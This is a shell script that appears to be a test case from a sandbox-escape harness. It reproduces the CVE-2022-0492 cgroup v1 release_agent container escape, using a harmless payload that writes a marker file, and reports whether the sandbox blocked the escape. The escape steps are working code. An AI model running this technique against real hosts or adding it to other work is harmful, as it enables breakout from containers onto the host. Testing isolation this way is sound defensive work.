#!/bin/sh
# id: 06-cgroup-release-agent
# title: mount cgroup v1 and set release_agent (CVE-2022-0492 style)
# class: kernel-surface
# expect: blocked
# timeout: 20s
#
# Imitates: CVE-2022-0492: a container with CAP_SYS_ADMIN mounts a cgroup
# v1 hierarchy (rdma or memory, often unused and so unguarded), writes its
# own release_agent, creates a child cgroup with notify_on_release=1, puts
# itself in it and then moves back out so the child empties and its
# release fires -- on a vulnerable host that runs release_agent as the
# host, not as the sandbox. The payload only appends a marker file; it
# never touches a running process.

result="BLOCKED cgroup v1 controller unavailable"
mnt=/tmp/rf-cgroup-$$
mkdir -p "$mnt"

mounted=""
for ctrl in rdma memory; do
	if mount -t cgroup -o "$ctrl" cgroup "$mnt" 2>/dev/null; then
		mounted="$ctrl"
		break
	fi
done

if [ -n "$mounted" ]; then
	result="EXPOSED cgroup v1 ($mounted) mountable from inside the sandbox"
	ra="$mnt/release_agent"
	if [ -w "$ra" ]; then
		payload="/bin/sh -c echo x > $RF_HOST_MARKER_PATH"
		if echo "$payload" >"$ra" 2>/dev/null; then
			child="$mnt/rf-child"
			mkdir -p "$child"
			echo 1 >"$child/notify_on_release" 2>/dev/null
			echo $$ >"$child/cgroup.procs" 2>/dev/null
			echo $$ >"$mnt/cgroup.procs" 2>/dev/null
			rmdir "$child" 2>/dev/null
			result="ESCAPED release_agent is writable and armed; harness checks whether it fired on the host"
		fi
	fi
	umount "$mnt" 2>/dev/null
fi
rmdir "$mnt" 2>/dev/null

echo "RESULT: $result"
